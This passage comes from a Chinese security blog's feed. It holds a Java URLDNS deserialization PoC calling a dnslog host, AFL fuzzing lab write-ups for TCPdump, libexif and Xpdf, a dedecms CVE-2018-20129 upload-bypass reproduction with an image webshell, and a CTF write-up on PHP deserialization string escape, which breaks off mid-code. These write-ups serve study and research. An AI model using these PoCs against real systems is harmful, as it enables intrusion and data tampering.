</span>&#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> HashMap&lt;URL, Integer&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://3dsmkp.dnslog.cn/&quot;</span>);</span><br><span class="line">        <span class="comment">// 更改url对象的hashcode为999</span></span><br><span class="line">        Class&lt;? extends URL&gt; c = url.getClass();</span><br><span class="line">        Field hashCode = c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">// URL的hashCode是private类型，所以要设置权限</span></span><br><span class="line">        hashCode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">999</span>);</span><br><span class="line"></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put完之后再把hashCode改为-1，确保反序列化成功</span></span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;URL.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashmap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在测试类中测试反序列化结果：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;URL.ser&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用成功：</p><p><img src="https://s2.loli.net/2023/07/14/8ok4OY5ImDQg1Pq.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing101 Exercise 3 - TCPdump</title>
      <link href="2023/07/09/fuzzing-lab3/"/>
      <url>2023/07/09/fuzzing-lab3/</url>
      
        <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><blockquote><p>In order to complete this exercise, you need to:</p><ol><li>Find an efficient way to fuzz TCPdump</li><li>Try to figure out how to enable ASan for fuzzing</li><li>Fuzz TCPdump until you have a few unique crashes</li><li>Triage the crashes to find a PoC for the vulnerability</li><li>Fix the issue</li></ol></blockquote><h2 id="准备程序"><a href="#准备程序" class="headerlink" title="准备程序"></a>准备程序</h2><p>准备TCPdump和其依赖的libpcap</p><p><img src="https://s2.loli.net/2023/07/09/w7rp6Pa5XLniEJb.png" alt=""></p><p>根据题解的说明，需要将libpcap-libpcap-1.8.0重命名为libpcap-1.8.0，要不然编译的时候会出问题。</p><p>构建与编译libpcap：</p><p><img src="https://s2.loli.net/2023/07/09/Be5fMvNTEW3uZJ6.png" alt=""></p><p><img src="https://s2.loli.net/2023/07/09/Vc8j6vi2S4b1sfL.png" alt=""></p><p>构建与编译TCPdump：</p><p><img src="https://s2.loli.net/2023/07/09/f4A3Xl1pgr9qvDy.png" alt=""></p><p><img src="https://s2.loli.net/2023/07/09/zVSfD1g76kIselF.png" alt=""></p><p>安装完成：</p><p><img src="https://s2.loli.net/2023/07/09/icXgsUIDbw2HKSy.png" alt=""></p><h2 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h2><p>其中，在tcpdump下的tests目录里面，有很多示例文件：</p><p><img src="https://s2.loli.net/2023/07/09/gvjFBMsl9NdxmPR.png" alt=""></p><p>图中的参数说明如下：<br>vvvv：详细输出</p><p>XX：以16进制模式显示</p><p>ee：显示帧头部的信息</p><p>nn：禁用域名解析</p><h2 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h2><p>这次的实验需要开启AddressSanitizer，ASan是一个内存检测器，可以用来检测和调试与内存相关的问题比如缓冲区溢出等问题。</p><p>编译libpcap：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">./configure CC=afl-clang-lto --enable-shared=no</span><br><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure><p>编译tcpdump：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -r ./install/</span><br><span class="line">make clean</span><br><span class="line">AFL_USE_ASAN=1 ./configure CC=afl-clang-lto --enable-shared=no --prefix=`pwd`/install/</span><br><span class="line">AFL_USE_ASAN=1 make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>编译完成后，准备进行fuzz。</p><h2 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -m none -i ./tests/ -o ../fuzz-out/ -s 123 -- ./install/sbin/tcpdump -vvvvXX -ee -nn -r @@</span><br></pre></td></tr></table></figure><p>其中-m选项可以指定内存限制模式，指定为none表示不限制其使用的内存量。</p><p>fuzz了两天，才出了一个crash，不知道是不是脸太黑了，还是有什么没有注意到的点。。。</p><p><img src="https://s2.loli.net/2023/07/11/zRdOtY82phwrvPc.png" alt=""></p><h2 id="验证crash"><a href="#验证crash" class="headerlink" title="验证crash"></a>验证crash</h2><p><img src="https://s2.loli.net/2023/07/11/dKbI2xWpLDfckoq.png" alt=""></p><p>ASan提示堆溢出，给出了具体的相关信息。</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>可以发现导致漏洞发生的strcmp被做了处理</p><p><img src="https://s2.loli.net/2023/07/11/5KQmwqu2UCgDYni.png" alt=""></p><p>修复后之前的crash正常被执行：</p><p><img src="https://s2.loli.net/2023/07/11/sfqMQ3Z2KHbvIBk.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing101 Exercise 2 - libexif</title>
      <link href="2023/07/08/fuzzing-lab2/"/>
      <url>2023/07/08/fuzzing-lab2/</url>
      
        <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><blockquote><p>In order to complete this exercise, you need to:</p><ol><li>Find an interface application that makes use of the libexif library</li><li>Create a seed corpus of exif samples</li><li>Compile libexif and the chosen application to be fuzzed using afl-clang-lto</li><li>Fuzz libexif until you have a few unique crashes</li><li>Triage the crashes to find a PoC for each vulnerability</li><li>Fix the issues</li></ol></blockquote><h2 id="准备libexif使用的接口程序"><a href="#准备libexif使用的接口程序" class="headerlink" title="准备libexif使用的接口程序"></a>准备libexif使用的接口程序</h2><p>要测试的libexif的版本为0.6.14，链接为<a href="https://github.com/libexif/libexif/releases/tag/libexif-0_6_14-release">https://github.com/libexif/libexif/releases/tag/libexif-0_6_14-release</a><br>libexif项目中描述了使用libexif作为库的几个前端项目</p><blockquote><h2 id="FRONTENDS"><a href="#FRONTENDS" class="headerlink" title="FRONTENDS"></a>FRONTENDS</h2><p>Here are a few frontends to libexif:</p><ul><li>exif:     A small command-line utility to show EXIF information in JPEG<pre><code>      files (https://github.com/libexif/exif).</code></pre></li><li>gexif:    A GTK+ frontend for editing EXIF data<pre><code>      (https://github.com/libexif/gexif).</code></pre></li><li>gphoto2:  A command-line frontend to libgphoto2, a library to access a<pre><code>      wide range of digital cameras (http://www.gphoto.org).</code></pre></li><li>gtkam:    A GTK+ frontend to libgphoto2 (<a href="http://www.gphoto.org">http://www.gphoto.org</a>).</li><li>thirdeye: Digital photos organizer and driver for eComStation<pre><code>      (http://ecomstation.ru/thirdeye).</code></pre></li><li>digikam:  digital photo management application for KDE<pre><code>      (https://www.digikam.org/)</code></pre></li></ul><p>If you would like to migrate your program to use libexif or add EXIF support<br>to it, don’t hesitate to contact the authors.</p></blockquote><p>选择exif来进行测试，exif是照片中的一些附加信息，包括拍摄参数，图像参数等信息，还可以自定义消息<br>看了课后解析，这个地方exif的版本要选择对应libexif的版本才没有问题，exif 0.6.15下载地址：<a href="https://sourceforge.net/projects/libexif/files/exif/0.6.15/exif-0.6.15.tar.gz/download">https://sourceforge.net/projects/libexif/files/exif/0.6.15/exif-0.6.15.tar.gz/download</a></p><p><img src="https://s2.loli.net/2023/07/08/UfFdEliY7RrpG9s.png" alt=""></p><p>构建libexif：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autoreconf -i</span><br><span class="line">./configure --enable-shared=no --prefix=<span class="variable">$LAB</span>/libexif-libexif-0_6_14-release/install/</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>构建exif:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autoreconf -i</span><br><span class="line">./configure --enable-shared=no --prefix=<span class="variable">$LAB</span>/exif-0.6.15/install/ PKG_CONFIG_PATH=<span class="variable">$LAB</span>/libexif-libexif-0_6_14-release/install/lib/pkgconfig/</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>其中PKG_CONFIG_PATH用于指定pkg-config查找库文件的路径，多个路径之间可以用冒号进行分隔。</p><h2 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h2><p>下载示例图像：<code>wget https://github.com/ianare/exif-samples/archive/refs/heads/master.zip</code></p><p>用之前构建的exif查看示例中的样本图像的exif数据：</p><p><img src="https://s2.loli.net/2023/07/08/uvd8ZmUT1S5rG7k.png" alt=""></p><h2 id="使用afl-clang-lto编译程序"><a href="#使用afl-clang-lto编译程序" class="headerlink" title="使用afl-clang-lto编译程序"></a>使用afl-clang-lto编译程序</h2><p>使用afl-clang-lto编译libexif</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -r install/</span><br><span class="line">make clean </span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot; </span><br><span class="line">./configure CC=afl-clang-lto --enable-shared=no --prefix=$LAB/libexif-libexif-0_6_14-release/install/ </span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>使用afl-clang-lto编译exif</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -r install/</span><br><span class="line">make clean</span><br><span class="line">./configure CC=afl-clang-lto --enable-shared=no --prefix=`pwd`/install/ PKG_CONFIG_PATH=$LAB/libexif-libexif-0_6_14-release/install/lib/pkgconfig/</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>实验中还告诉了我们选择编译包装器的技巧：</p><blockquote><p>+————————————————+<br>| clang/clang++ 11+ is available | —&gt; use LTO mode (afl-clang-lto/afl-clang-lto++)<br>+————————————————+     see <a href="instrumentation/README.lto.md">instrumentation/README.lto.md</a><br>    |<br>    | if not, or if the target fails with LTO afl-clang-lto/++<br>    |<br>    v<br>+————————————————-+<br>| clang/clang++ 6.0+ is available | —&gt; use LLVM mode (afl-clang-fast/afl-clang-fast++)<br>+————————————————-+     see <a href="instrumentation/README.llvm.md">instrumentation/README.llvm.md</a><br>    |<br>    | if not, or if the target fails with LLVM afl-clang-fast/++<br>    |<br>    v<br> +————————————————+<br> | gcc 5+ is available            | -&gt; use GCC_PLUGIN mode (afl-gcc-fast/afl-g++-fast)<br> +————————————————+    see <a href="instrumentation/README.gcc_plugin.md">instrumentation/README.gcc_plugin.md</a> and<br>                                       <a href="instrumentation/README.instrument_list.md">instrumentation/README.instrument_list.md</a><br>    |<br>    | if not, or if you do not have a gcc with plugin support<br>    |<br>    v<br>   use GCC mode (afl-gcc/afl-g++) (or afl-clang/afl-clang++ for clang)</p></blockquote><h2 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h2><p>使用afl进行fuzz：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i ../exif-samples-master/jpg -o ../fuzz-out/ -s 123 -- ./install/bin/exif @@</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/07/08/NTuq3UOGnglSFQK.png" alt=""></p><h2 id="验证crash"><a href="#验证crash" class="headerlink" title="验证crash"></a>验证crash</h2><p>使用gdb进行验证</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb --args ./exif ../../../fuzz-out/default/crashes/id:000000,sig:11,src:000319,time:140969,execs:123401,op:havoc,rep:1 output</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/07/08/bskndu2MlW9tGxA.png" alt=""></p><p>调用栈回溯情况：</p><p><img src="https://s2.loli.net/2023/07/08/1zbMAPvVBgtfck6.png" alt=""></p><p>另外一种crash：</p><p><img src="https://s2.loli.net/2023/07/08/efIYOWoFgRyPrQz.png" alt=""></p><h2 id="总结思考"><a href="#总结思考" class="headerlink" title="总结思考"></a>总结思考</h2><p> 通过实验2，继续加深了使用AFL对程序进行fuzz的基本流程，并且学会了编译包装器的选择，下一步要加深对漏洞的理解与分析。</p>]]></content>
      
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing101 Exercise 1 - Xpdf</title>
      <link href="2023/07/07/fuzzing-lab1/"/>
      <url>2023/07/07/fuzzing-lab1/</url>
      
        <content type="html"><![CDATA[<h2 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h2><p>编译xpdf<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure --prefix=<span class="string">&quot;/home/lemon/Documents/AFL/fuzzing_xpdf/xpdf-3.02/install/&quot;</span></span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>下载三个样本：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">wget http://www.africau.edu/images/default/sample.pdf</span><br><span class="line">wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf</span><br></pre></td></tr></table></figure><br><img src="https://s2.loli.net/2023/07/07/HomMfyYCiWdVNUl.png" alt=""></p><p>xpdf功能测试：<br><img src="https://s2.loli.net/2023/07/07/Zh2HEp845fPlwzU.png" alt=""></p><p>下面正式开始用AFL进行fuzz，首先进行插桩编译<br>修改CC和CXX，配置编译选项和安装目录：<br><img src="https://s2.loli.net/2023/07/07/gXLp2vo9VKOt6fj.png" alt="image.png"><br>之后使用<code>make &amp;&amp; make install</code>进行编译安装</p><p>运行afl-fuzz<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure><br>参数解释：<br>-i：输入路径<br>-o：输出路径<br>-s：fuzzing时随机数使用的种子<br>—：目标程序<br>@@：被fuzz的程序从文件读取输入</p><p><img src="https://s2.loli.net/2023/07/07/gOWP1wLmlXiE2sc.png" alt="image.png"></p><p>运行了一会发现有三个崩溃点<br><img src="https://s2.loli.net/2023/07/07/8biwVhOpGAHylFm.png" alt="image.png"></p><p>crash文件<br><img src="https://s2.loli.net/2023/07/07/IlK3BFmVCeJ971W.png" alt="image.png"></p><p>根据实验要求解决如下问题：</p><blockquote><p>In order to complete this exercise, you need to:</p><ol><li>Reproduce the crash with the indicated file</li><li>Debug the crash to find the problem</li><li>Fix the issue</li></ol></blockquote><h2 id="重现崩溃"><a href="#重现崩溃" class="headerlink" title="重现崩溃"></a>重现崩溃</h2><p>以id:000000,sig:11,src:000742,time:643742,execs:237215,op:havoc,rep:3文件为例<br>将crash文件作为文件输入给pdftotext：<br><img src="https://s2.loli.net/2023/07/07/g4XuHDGaOh3pSiU.png" alt="image.png"><br>显示报错，经过后文的调试分析应该是无限递归导致了栈溢出</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>gdb加载程序：<br><img src="https://s2.loli.net/2023/07/07/IN6EWdzrAXHbZxQ.png" alt="image.png"><br>使用run指令，运行程序<br>使用bt查看调用回溯，发现在Parser.cc中存在一个无限递归<br><img src="https://s2.loli.net/2023/07/07/IqZ4k3iVx9bc6ld.png" alt="image.png"></p><p>定位到源码出，似乎是在这个地方有个递归调用<br><img src="https://s2.loli.net/2023/07/07/3NYwa6lGWErFOh4.png" alt="image.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>查看4.02版的源码，这个漏洞得到了修复：[xpdf-4.02.tar.gz][<a href="https://dl.xpdfreader.com/old/xpdf-4.02.tar.gz">https://dl.xpdfreader.com/old/xpdf-4.02.tar.gz</a>]</p><p>diff一下：<br><img src="https://s2.loli.net/2023/07/07/gIsGfJtrCBnowdc.png" alt="image.png"><br>发现加了一个recursion变量，并且加了一个recursionLimit宏定义，限制了递归的最大次数<br><img src="https://s2.loli.net/2023/07/07/8X1jadIw76ZRNCx.png" alt="image.png"></p><h2 id="总结思考"><a href="#总结思考" class="headerlink" title="总结思考"></a>总结思考</h2><p>通过lab1，我学到了使用AFL fuzz程序的基本流程，以及简单的AFL工具的基本使用方法。通过AFL提供的crash信息配合gdb可以比较准确的定位到报错点，再定位到源码进行分析。</p>]]></content>
      
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2018-20129-dedecms-SP2前台文件上传漏洞分析复现</title>
      <link href="2021/11/05/SP2%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/11/05/SP2%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先去官网下载dedecms的源码到本地<br>由于我是mac环境，就用了MAMP Pro，win下可以使用方便的phpstudy</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4csbaf9mj31ej0u0jvp.jpg" alt=""></p><p>在web端访问如图所示：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4cuqdyfwj31kr0u00ym.jpg" alt=""></p><p>填写如下信息：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4cwv341vj30zu0u0goq.jpg" alt=""></p><p>网站搭建完成：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4cytckujj31c40u0n0c.jpg" alt=""></p><p>使用rips代码审计系统进行漏洞扫描</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4dbm3t24j31680u0ahp.jpg" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4do25f60j31uc0o0mze.jpg" alt=""></p><p>漏洞页面位于会员用户的相关操作中，我们点击注册账号的时候，提示信息如下：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4dozrwu2j31000igjrv.jpg" alt=""></p><p>我们需要进到配置页面开启会员功能，后台默认路由为/uploads/dede，默认用户名和密码都是admin</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4drmxsklj31im0u0whh.jpg" alt=""></p><p>在会员设置中打开会员功能</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4du9l8p7j31os0u0jzq.jpg" alt=""></p><p>注册个用户出来</p><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211105170629758.png" alt=""></p><p>注册成功后：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4dya4z7qj31lv0u0jv8.jpg" alt=""></p><p>点击个人空间后，发现需要验证</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4dyh0d07j311s0fajs6.jpg" alt=""></p><p>我们全局搜索该字符串，发现有一处引用：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4e4fnrqxj31ky0qugpj.jpg" alt=""></p><p>看到是根据<code>$_vars[&#39;spacesta&#39;]</code>这个变量来确定权限的，我们再次进入后台，找到系统设置-&gt;会员设置</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4e4zs0psj317q0u078l.jpg" alt=""></p><p>猜测是这个选项设置了权限，我们修改为0，再试试</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4e7jm1pkj31800nk78p.jpg" alt=""></p><p>再注册一个用户出来</p><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211105171834324.png" alt=""></p><p>发现已经可以访问个人空间了</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4e9yphjwj31t90u0n14.jpg" alt=""></p><p>退出个人空间后，我们点击内容中心-分类信息的发表文章的功能</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4edifiu5j31f20u077b.jpg" alt=""></p><p>简单制作一个图片🐴</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4ejzvi8dj30o609gabe.jpg" alt=""></p><p>开启burp抓包，然后选择上传图片到服务器上</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4f3l2x9qj31co0u0wge.jpg" alt=""></p><p>成功截获http报文</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4f4dehfhj31j70u0wol.jpg" alt=""></p><p>利用这条正则来bypass</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4kuzu8pvj319o0bi40n.jpg" alt=""></p><p>所以我们将包改为：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4kvitwz2j31yl0u0nbh.jpg" alt=""></p><p>上传成功</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CVE </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>备赛选择题大赛决赛之被迫成为web手</title>
      <link href="2021/10/26/%E5%A4%87%E8%B5%9B%E9%80%89%E6%8B%A9%E9%A2%98%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/"/>
      <url>2021/10/26/%E5%A4%87%E8%B5%9B%E9%80%89%E6%8B%A9%E9%A2%98%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><ul><li>PHP反序列化字符逃逸</li></ul><p>PHP反序列化字符逃逸就是通过目标代码的一些操作改变序列化字符串的长度来导致反序列化漏洞。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="反序列化字符串变长逃逸"><a href="#反序列化字符串变长逃逸" class="headerlink" title="反序列化字符串变长逃逸"></a>反序列化字符串变长逃逸</h4><p>观察如下poc<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passsword</span> = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"><span class="comment">// O:4:&quot;Test&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;aaaa&quot;;s:9:&quot;passsword&quot;;s:4:&quot;bbbb&quot;;&#125;</span></span><br><span class="line"><span class="variable">$tmp1</span> = filter(serialize(<span class="variable">$t</span>));</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp1</span>);</span><br></pre></td></tr></table></figure><br>我们在代码中加了一个filter函数，来将a替换为bb，我们分别用filter和不用filter序列化同一个对象观察结果。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsfvltgmgj30xu02qq3c.jpg" alt=""></p><p>可以看到字符串变长了，那么我们思考，字符串变长会发生什么？</p><p>答：我们可以人为构造恶意数据，字符串变长意味着可以逃逸，因为由于s:4的存在，该成员变量只会读取后四个字符来作为该变量，导致过长的部分可以“顶到”后面去，那么我们就可以构造恶意数据来篡改其他成员变量的值，比如加上”;}之类的来闭合数据，看如下实例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure><p>我们尝试不加filter，然后正常序列化，发现构造的恶意数据逃逸不了，并不会因为双引号之类的特殊字符而造成闭合啥的</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsgcrtc4lj315e04k0u1.jpg" alt=""></p><p>如果我们加了filter会变成这样</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$tmp</span> = filter(serialize(<span class="variable">$t</span>));</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span 